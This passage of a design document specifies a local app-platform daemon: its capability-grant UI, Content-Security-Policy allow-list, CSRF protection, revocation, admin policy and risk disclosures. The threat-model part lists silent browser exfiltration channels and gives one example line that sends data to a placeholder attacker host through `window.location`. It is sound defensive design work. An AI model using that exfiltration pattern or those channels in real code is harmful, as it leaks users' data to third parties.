media-src  'self' https://api.openai.com;
```

The frontend gets exactly the same network reach as the backend — no more, no
less. Granting the network cap is granting it to *the whole app*, backend and
frontend together.

**Silent exfil channels the CSP must close.** Each of these is a GET-with-URL
channel that leaks by issuing a request anywhere the attacker chose:

- `<img src="...">` — covered by `img-src`
- `<link rel="prefetch"/"dns-prefetch">` — covered by `prefetch-src` (where
  supported) and `connect-src` fallback
- `<form action="...">` on submit — covered by `form-action`
- `fetch()` / `XMLHttpRequest` / `WebSocket` / `EventSource` — covered by
  `connect-src`
- `navigator.sendBeacon` — covered by `connect-src`
- `<a ping="...">` — covered by `connect-src`
- `@import url("...")` in CSS — covered by `style-src`
- `<video>` / `<audio>` / `<track>` — covered by `media-src`
- `<iframe>` / `<frame>` — covered by `frame-src` (add `frame-src 'self'`
  explicitly, or rely on `default-src 'none'`)
- `<object>` / `<embed>` / Flash-era — covered by `object-src 'none'`
- `<script src="...">` — covered by `script-src`
- Web fonts via `@font-face src:` — covered by `font-src`

Anything missing from CSP becomes an exfil channel. The policy must be
allow-list by default (`default-src 'none'`), not deny-list.

**Top-level navigation is observable, not silent.** `window.location = "https://evil/?data=..."`
or a `<a href="https://evil">` link the operator clicks leaves the app — the
URL bar changes, the operator sees they're on a different site. This is a
phishing/steal-the-user risk, not a silent exfil risk. Defense is not CSP
(there's no reliable navigation-blocking CSP directive after `navigate-to` was
removed) but: (a) the operator sees the navigation, (b) the daemon sets
`Cross-Origin-Opener-Policy: same-origin` so `window.open` popups don't share
browsing context, (c) links in app UI to external sites get
`rel="noopener noreferrer"` automatically where the daemon can rewrite.

**Permissions-Policy header** disables platform APIs the app hasn't declared
a cap for: `camera=(), microphone=(), geolocation=(), clipboard-read=(),
clipboard-write=(), fullscreen=(self), ...`. Each of these is a separate
capability-bearing browser feature. Default off, opt-in via manifest.

**Referrer-Policy: no-referrer.** Even within allowed hosts, don't leak URLs
(which may contain tokens, IDs, secrets) via the `Referer` header.

**Subresource Integrity.** If a cap ever allows third-party scripts (it
shouldn't for v1), SRI hashes must be mandatory. For v1: all scripts from
`'self'` only, no third-party JS ever. CDN convenience is not worth the
supply-chain exposure.

**CSP is daemon-enforced, not app-advisory.** The app cannot emit its own
`<meta http-equiv="Content-Security-Policy">` that overrides the header — the
HTTP header takes precedence for most directives, and meta-CSP only *tightens*
what the header already allows. The daemon's CSP is the ceiling.

#### Risk-tiered friction: fatigue scales with danger

Not every cap deserves the same consent UI. Map friction to risk class
(see "Cap risk disclosure" below):

- **Inert** (time, self, stdout-to-app-UI): grant-on-install without a prompt,
  IF the operator opted into "auto-grant inert caps" at setup. Otherwise
  bundled into the install-time manifest review (one click for all inert caps).
- **Scoped** (app-private kv, app-private db): single-click approve in the
  grant UI, no extra confirmation. Blast radius is limited to the app itself.
- **Local** (fs read/write in sandbox dir, spawn within whitelist): single-click
  approve, but the grant UI emphasizes the risk class with color and an icon.
- **Network** (http_client with host whitelist): operator must confirm the
  specific host list. The UI shows the exact hosts from the manifest; operator
  types/clicks a confirmation for the hostname set.
- **Shared** (shared_db, cross-app cap access, ffi, unrestricted fs, spawn
  without whitelist): operator must explicitly type "grant" or hold-to-confirm
  for ~1 second. High-risk grants cannot be one-click. Plus a cooldown: submit
  button is disabled for 500ms after page load, preventing "page loaded → auto-submit"
  scripts from beating a human to the click even if they somehow reached the UI.

The cooldown and hold-to-confirm are not about frustrating humans — they're
about making high-risk grants impossible to complete faster than a human can
intend to click. A script that somehow gets past origin isolation still can't
submit instantly.

#### Fatigue reducers that preserve security

The grant UI is per-app, not per-cap. Operator reviews the whole manifest once
at launch time, approves/denies the set, done. This is the existing design —
what makes it fatigue-safe is batching, not per-cap prompting.

**Install-time manifest review.** When a PNG is installed, the operator sees
the full cap list once. Grants persist; subsequent launches of the same
manifest don't re-prompt. Only manifest *changes* re-prompt, and only for the
diff.

**Recommend (don't default) auto-grant of inert caps.** During setup the wizard
offers: "auto-approve low-risk caps (time, self, stdout)? This reduces prompts
for apps that only use harmless operations." Opt-in. No ambient consent.

**Session grants vs permanent grants.** For medium-risk caps (kv, db), the
grant UI offers "just this session" as the default and "permanently" as a
secondary option. Short-lived grants for short-lived tasks.

**First-party marker.** Apps shipped as part of the platform (library, shell,
card viewer) can be distinguished at install time by signature. First-party
apps can carry wider default grants (still visible in the UI). Third-party
apps get stricter defaults. The distinction is declared at install, not
claimed by the app.

**Explicit trust upgrade.** Operator can mark a specific app as "trusted" after
using it — future manifest additions of low/medium risk caps get auto-approved
for that app only, with notification. High-risk additions always re-prompt
regardless of trust level. Trust is per-app, not global.

#### What must never happen

- **Auto-grant of network or shared caps.** Not even with "trusted" markers.
  Every network/shared grant requires explicit current consent.
- **Cross-app grant delegation.** App A cannot grant caps to App B, even if A
  is itself trusted.
- **Grant via app-served UI.** Only the daemon UI (at the daemon origin) can
  accept grants. An app's own UI cannot present "approve this cap" and have
  it work, even if the operator clicks.
- **Ambient caps.** The grant check runs at cap construction time. There is no
  global "default open" state for any cap class. Denied until explicitly
  granted.
- **Grant expiry without re-prompt.** If a grant expires (session ended,
  manifest changed), the cap becomes unavailable. It cannot silently renew.
  The operator must re-grant.

### Authentication

"Session" above assumes the daemon can identify the operator. Three supported
modes:

- **Tailscale mode (v1):** trust the connection. Tailscale handles auth at the
  network layer; the daemon reads a synthetic session id from the client IP. No
  login, no password.
- **Token mode:** operator configures a bearer token at setup (stored locally,
  required in `Authorization: Bearer <token>`). A login page sets a session
  cookie; subsequent requests use the cookie.
- **No-auth mode:** daemon binds to `127.0.0.1` only, trusts all local
  connections. For single-user development on a single machine.

Auth is orthogonal to the grant flow. The grant flow treats "the operator" as
an abstract principal — whichever auth mode is active maps to a session id.

### CSRF protection

Every HTML form and JSON API call includes a session-bound CSRF token:

- **Initial page load** sets a cookie `session=<sid>; SameSite=Strict; HttpOnly`
  and sends the matching CSRF token via a `<meta name="csrf" content="...">` tag
  (for JS) and a `<input type="hidden" name="csrf">` (for forms).
- **Library JS** reads the meta tag and attaches `X-CSRF-Token` to every
  fetch.
- **Daemon validates** that the CSRF header/field matches the cookie's session.
  Mismatch → 403.

`SameSite=Strict` alone would cover most cases, but CSRF tokens are belt-and-suspenders
and cost ~nothing.

### Revoke flow

The settings page `/settings` shows all apps with their granted caps:

```
Alice (running)
  ✓ llm_api (api.openai.com)  [Revoke]
  ✓ conversations (db)          [Revoke]
  [Stop app] [Stop & revoke all]

Bob (not running)
  ✓ kv                          [Revoke]
  [Launch] [Revoke all]
```

Revoke:
1. `POST /api/daemon/revoke { app_id, cap_name }`
2. Daemon calls the cap's revocation closure (sets `revoked = true`)
3. Updates `grants.json` to mark the cap denied
4. Next cap method call returns `nil, "capability revoked"`
5. App decides how to handle — typically shows an error to its user

Revoking a required cap effectively kills the app but the process keeps running
until the operator stops it explicitly. Apps should handle revocation of
required caps by surfacing an error, not crashing.

### Edge cases

**Launch a running app:** daemon returns `{ url: "/app/alice/" }` immediately,
no grant flow. The app is already sandboxed with its prior caps.

**Manifest changed since last launch:** detect by comparing the set of declared
caps to the set in `grants.json`. If new caps appeared, treat them as undecided
and go through the grant flow. Existing granted/denied decisions are preserved.

**Two concurrent launch attempts for the same app:** first one starts the app,
second gets `{ url: "/app/alice/" }` since it's already running. Token matchup
prevents the second browser tab from completing a grant flow meant for a
different session.

**Browser back button to grant page after submission:** token is already
consumed, page shows "this grant attempt already completed — [launch again]".

**Operator closes the grant tab:** token expires after 5 minutes. No cleanup
needed; `grants.json` is untouched.

### App lifecycle

**Launch:**
1. Daemon loads app (PNG or directory, same as `platform.load_app`)
2. Reads manifest, resolves entry point
3. Checks grant state — redirect to grant UI if needed
4. Calls `construct_caps()` with granted capabilities
5. Calls `entry_mod.create(caps)` → gets `{ handler = fn }`
6. Mounts handler at `/app/<app_id>/`
7. Returns app URL to browser

**Request routing:**
- Request to `/app/alice/api/messages` → strip prefix → `alice.handler({ path = "/api/messages", ... })`
- App sees paths relative to its own root, unaware of the daemon's mount point
- App's static files (HTML, JS, CSS) served via the same handler

**Stop:**
- `POST /api/daemon/stop { app_id: "alice" }`
- Daemon calls revocation closures for all caps
- Removes handler from router
- App's in-flight requests get `503`

**Crash isolation:**
- Each app handler runs in a `pcall`. If it errors, the daemon logs the error
  and returns `500` to the browser — other apps and the daemon are unaffected.
- Persistent crashes can trigger auto-stop with a UI notification.

### Path rewriting

Apps expect to be served at `/`. The daemon mounts them at `/app/<id>/`. This
requires rewriting:

- **Incoming requests:** Strip `/app/<id>` prefix before passing to handler
- **Outgoing HTML:** Not rewritten. Instead, apps use relative paths (`./api/foo`,
  `./style.css`), which the browser resolves correctly against the current URL.
  This is already the convention — `app.js` uses `fetch("/api/apps")` etc.

Wait — existing apps use absolute paths like `/api/apps`. This won't work under
a prefix mount. Two options:

1. **Apps use relative paths.** Change `fetch("/api/apps")` to `fetch("api/apps")`
   (no leading slash). The browser resolves relative to the current page URL.
   Requires the mounted path to end with `/` (i.e., `/app/alice/` not `/app/alice`).

2. **Inject a `<base>` tag.** The daemon rewrites the HTML `<head>` to include
   `<base href="/app/alice/">`. All relative URLs resolve against that base.
   More fragile, but apps don't need to change.

**Decision: option 1 (relative paths).** It's explicit, no magic rewriting, and
works identically in standalone mode (served at `/`) and daemon mode (served at
`/app/id/`). Apps should already avoid absolute paths — it's the portable default.

### Daemon API

```
POST /api/daemon/launch   { app_id }           → { url } | { redirect: grant_url }
POST /api/daemon/stop     { app_id }           → { ok }
POST /api/daemon/grant    { app_id, grants }   → { url } | { error }
GET  /api/daemon/apps                          → { apps: [...] }  (running apps)
GET  /api/daemon/status                        → { uptime, apps_running, ... }
POST /api/daemon/revoke   { app_id, cap_name } → { ok }
```

### Cap scoping: per-app by default

Every cap is **scoped to the app that was granted it**. This is the principle of
least privilege and it's non-negotiable — the sandbox guarantee depends on it.

Concretely:
- `kv` and `db` storage paths are resolved via `_resolve_data_path(cap_name, scope, context)`
  where `context.app_id` makes each app's store isolated.
- `http_client` host whitelists come from the app's manifest — alice cannot call
  hosts that bob declared.
- `http_server` ports are never shared between apps (each app has its own handler
  mounted at its own prefix).
- `shared_db` uses an authorizer keyed on `context.app_id` so apps only see their
  own rows in shared tables.
- Revocation is per-app — revoking `llm_api` for alice has no effect on bob.

Two apps asking for "the same cap" get **two different cap instances** with
independent state, independent revocation, and independent authorization.

### Blanket allows: reducing grant fatigue

Forcing the operator to approve every cap for every app becomes noise — prompted
fifty times in a week, they start clicking "allow" reflexively. That erodes the
security model faster than any technical bug would.

The fix is **not** to grant more by default. The fix is to avoid prompting for
caps where prompting adds nothing.

Three mechanisms, in decreasing order of safety:

#### 1. Cap risk classes (opt-in during setup)

Some cap types have no plausible abuse vector. Granting `time` to an app lets it
read the system clock. There is no attack surface. Prompting the operator for
this is just noise — **but the operator should opt in to that shortcut, not
discover it after the fact**.

The platform defines risk classes as metadata. **Defaults prompt for everything.**
The setup flow (or a later settings page) can *recommend* enabling auto-grant for
inert caps, with a checkbox the operator explicitly ticks.

| Class | Caps | Recommended setup default |
|-------|------|---------------------------|
| **Inert** | `time`, `self`, `stdout` | Offered as "skip prompts for harmless caps" opt-in |
| **Scoped** | `kv`, `db` | Always prompt (per app); storage is app-scoped |
| **Local** | `http_server`, `cli`, `stdin` | Always prompt per app |
| **Network** | `http_client` (with host) | Always prompt per app + per host |
| **Shared** | `shared_db`, `fs` | Always prompt per app + show scope |

Classes are **defined by the platform**, not the app. The app cannot relabel
`http_client` as "inert." The risk class is a property of the cap type's
implementation, encoded in the cap factory module.

**Nothing auto-grants out of the box.** A freshly installed crescent prompts for
every cap of every app on first launch. The operator can reduce that through
explicit opt-ins (`auto_grant: ["time", "self"]` in config, or the setup wizard's
"streamline prompts" checkbox). The decision to suppress prompts is always the
operator's, made once and auditable in settings.

#### 2. Explicit trust grants (per-source allow lists)

The operator can mark a trust source as "auto-grant whatever it asks for." Sources:

- **First-party apps.** Apps that ship with crescent (`lib/platform/apps/*`).
  These are code the operator already trusts by installing crescent. Still subject
  to the manifest — a first-party app can't access caps it didn't declare.
- **Signed apps.** If an app PNG is signed by a key in the operator's trusted
  keyring, auto-grant its declared caps. (Requires signing infrastructure — not v1.)
- **Manually trusted apps.** `POST /api/daemon/trust { app_id }` marks a specific
  app as trusted for future cap requests, after the operator has reviewed it once.

Trust is always **per-source**, never per-cap-type across apps. "Auto-grant
http_client for anyone who claims to be an AI app" is exactly the attack we're
trying to prevent — tags are app-controlled metadata.

#### 3. Remembered decisions (status quo)

Grants already persist across launches via `grants.json`. The operator approves
once per (app, cap) pair, and subsequent launches don't re-prompt unless the
manifest changes (new cap added, scope widened). This is the baseline.

### Admin policy: hard ceilings

The mechanisms above assume a single operator who is their own admin. For
multi-user deployments (family server, small team, shared Tailscale node), an
**admin policy** sets hard limits that no user can override.

**Direction is always restrictive.** Admin policy can forbid or narrow caps. It
can never expand what a user can grant, and it can never grant on a user's
behalf — consent is still the user's to give.

| Admin can... | Admin cannot... |
|--------------|-----------------|
| Forbid a cap type entirely (`fs: denied`) | Auto-grant a cap on a user's behalf |
| Narrow a host whitelist (`http_client: only api.openai.com`) | Widen a host whitelist beyond the app's manifest |
| Forbid specific trust sources (`signed_apps: disabled`) | Force a user to trust a source they don't |
| Cap storage quotas per app | Move data between users |
| Forbid opt-in auto-grant classes (`no skip-prompt for anyone`) | Make every user's grants public |

Policy storage:
- `~/.crescent/admin/policy.json` (root-owned in multi-user setups; user-owned
  and self-policing in single-user setups)
- Loaded on daemon start, re-read on SIGHUP or API call
- Not editable via the daemon's HTTP API unless the request authenticates as
  admin (separate credential from regular user sessions)

Policy structure (sketch):
```json
{
  "cap_policy": {
    "fs":          { "state": "denied" },
    "http_client": { "state": "allowed", "hosts": ["api.openai.com", "api.anthropic.com"] },
    "shared_db":   { "state": "denied" },
    "kv":          { "state": "allowed", "max_size_mb": 100 }
  },
  "trust_sources": {
    "first_party": "allowed",
    "signed":      "denied",
    "manual":      "allowed"
  },
  "auto_grant_classes": {
    "inert": "user_choice",
    "scoped": "forbidden"
  }
}
```

Enforcement points:
- **Manifest load.** If the manifest declares a denied cap type, the app is
  rejected at load time with "blocked by admin policy." The grant UI never shows.
- **Grant construction.** When building a cap, check policy constraints. A
  `http_client` declaration with `host: "evil.example"` is rejected even if the
  user would otherwise grant it.
- **Trust check.** Before applying a user's "trust this app" decision, check
  whether the trust source is admin-allowed.
- **Auto-grant check.** Before applying a user's auto-grant preference for a
  class, check whether the class is admin-allowed.

Visibility: the grant UI must show "blocked by admin policy" when a cap is
denied, not silently hide it. The user deserves to know why their app didn't
launch, and to ask the admin for an exception if needed.

Single-user vs multi-user: in single-user mode, the admin policy file may not
exist, and the daemon runs with no ceiling. The mechanism is designed so
"single-user with no admin policy" is the default; multi-user just adds a file.

### What blanket allows must never do

- **Auto-grant based on app metadata.** Tags, name, description — all
  app-controlled. A malicious app claims any tag it wants.
- **Grant caps not in the manifest.** The manifest is the cap ceiling. Trust
  grants can auto-approve declared caps; they can never widen the declaration.
- **Bypass per-app scoping.** Even auto-granted caps get per-app storage, per-app
  revocation, per-app authorizer. Auto-grant means "don't prompt," not "share
  state."
- **Grant silently with no audit.** Every auto-granted cap should be logged and
  visible in the daemon status UI. The operator should be able to see what's been
  granted without prompts and revoke retroactively.

### Cap risk disclosure

The grant UI must communicate **what each cap actually enables an attacker to do**,
not just restate the cap name. "http_client to api.openai.com" is technically
accurate but conveys nothing to a non-technical operator. The prompt should read
something like:

> **Alice wants: Network access to api.openai.com**
>
> This app can send any text you give it — messages, pasted documents, uploaded
> files — to api.openai.com. Once sent, that data is outside your control. Only
> allow this if you trust both the app and api.openai.com with your inputs.

Every cap type ships with a **risk disclosure** — a short paragraph written for
a non-technical reader, covering:

1. **What the app can do** with this cap, in concrete user-facing terms
2. **What an attacker controlling this app could do** (the worst case)
3. **What the cap does NOT give access to** (to calibrate — e.g., `time` doesn't
   reveal the user's location, only the clock)
4. **What the user can do if they regret it** (revoke, wipe app storage, etc.)

Sketch per cap type:

| Cap | Risk disclosure summary |
|-----|-------------------------|
| `time` | Reads the system clock. Cannot fingerprint the user. |
| `self` | Reads the app's own bundled files. Cannot modify them or see other apps. |
| `stdout` | Writes to the terminal output. Visible to the operator; no side effects on other programs. |
| `stdin` | Reads keyboard input intended for the app. Can prompt you, so treat prompts like app UI. |
| `kv` | Stores data in this app's isolated key-value store. Other apps cannot read it. Storage grows until you delete it. |
| `db` | Stores data in this app's isolated SQL database. Other apps cannot read it. Can accumulate unbounded data; revoke to freeze writes. |
| `http_server` | Binds a local port inside the daemon. Other apps on the same daemon cannot see its requests. |
| `http_client` | Sends HTTP requests to the listed hosts. **Anything the app processes can be transmitted to those hosts.** Assume data sent this way is permanently outside your control. |
| `fs` | Reads and writes files under the declared root path. **Data in that path is visible to the app and may be modified or deleted.** |
| `shared_db` | Reads and writes rows in a shared database tagged with this app's id. **Other apps with shared_db can see rows tagged with their own ids — not this app's.** The schema is shared, so column presence leaks across apps. |
| `cli` | Reads command-line arguments passed when the app was launched. Limited to what the operator typed. |

These are **per-cap-type** disclosures, written once in the cap factory module,
surfaced in the grant UI. Apps can add an **app-specific reason** in their
manifest ("Alice uses LLM access to generate her dialogue"), which the grant UI
shows alongside the standard disclosure. The app's reason is app-controlled
text — the platform's disclosure is the authoritative risk description.

**Scope-specific details** get rendered into the disclosure. A `fs` cap with
`root: "~/Documents/alice/"` should show the exact path ("This app can read and
write any file under ~/Documents/alice/"), not a generic template.

The grant UI must default to the safe action. **Deny is the primary button, allow
is secondary.** No spinner that auto-allows after a timeout. No pre-ticked
"approve all" checkbox.

### Security considerations

**The daemon is the operator.** It makes grant decisions on behalf of the human.
The grant UI must clearly communicate what each cap allows — not just `"http_client"`
but `"HTTP access to api.openai.com"`.

**No app can launch another app.** Only the daemon API (triggered by the human via
the library UI) can start apps. An app has no cap to call `/api/daemon/launch`.

**No app can access another app's routes.** The daemon checks the `Origin`/`Referer`
header (or uses per-app CSRF tokens) to prevent cross-app request forgery. App "alice"
cannot `fetch("/app/bob/api/secrets")` from its frontend JS.

**Grant UI must not be frameable.** The grant page sets `X-Frame-Options: DENY` to
prevent clickjacking by a malicious app that iframes the grant UI.

**Cap display names.** The grant UI needs human-readable descriptions of each cap
type. These come from the cap type modules, not from the app's manifest (which the
app could lie about).

## What this replaces

- `lib/platform/cli.lua` launch flow → daemon handles it
- CLI grant prompting → browser grant UI
- Per-app port binding → single daemon port with path routing
- No app lifecycle management → daemon tracks running apps

The CLI still works for terminal use. The daemon is an alternative entry point,
not a replacement. Both use the same grant storage, cap factories, and sandbox.

## Open questions

1. **Authentication.** The daemon serves on a network port. Over Tailscale this is
   fine (Tailscale handles auth). On a LAN or public network, the daemon needs its
   own auth. Options: HTTP basic auth, bearer token, Tailscale identity headers.
   For v1, assume Tailscale (no auth needed).

2. **Concurrent requests.** LuaJIT is single-threaded. If app A's handler blocks
   (e.g., waiting on an LLM response), app B's requests queue behind it. Options:
   coroutine-based async (apps yield during I/O), fork per app (loses in-process
   simplicity), or accept the limitation for v1 (most apps are fast handlers +
   SSE streams). Coroutine async is the likely eventual answer — it's how the
   HTTP server already works for SSE.

3. **Hot reload.** Can the daemon reload an app without restarting? Lua's module
   system makes this possible (`package.loaded[mod] = nil` + re-require), but cap
   state (open DB connections, etc.) needs cleanup. Useful for development but not
   critical for v1.

4. **Multiple instances.** Can two users launch the same app with separate state?
   Yes — the app_id can include a session suffix (`alice-session1`), and
   `_resolve_data_path` already scopes storage per app_id. The grant UI would need
   to distinguish "same app, different session" from "different app."

## Implementation order

1. **Daemon skeleton** — HTTP server on one port, router dispatching by path prefix
2. **Library app integration** — mount at `/`, serve from index DB
3. **App launch** — load app, construct caps, mount handler at `/app/<id>/`
4. **Grant UI** — HTML page listing caps, POST to persist and launch
5. **Path rewriting** — strip prefix on incoming, verify relative paths work
6. **Lifecycle API** — stop, status, revoke
7. **Cross-app isolation** — CSRF protection, frame busting
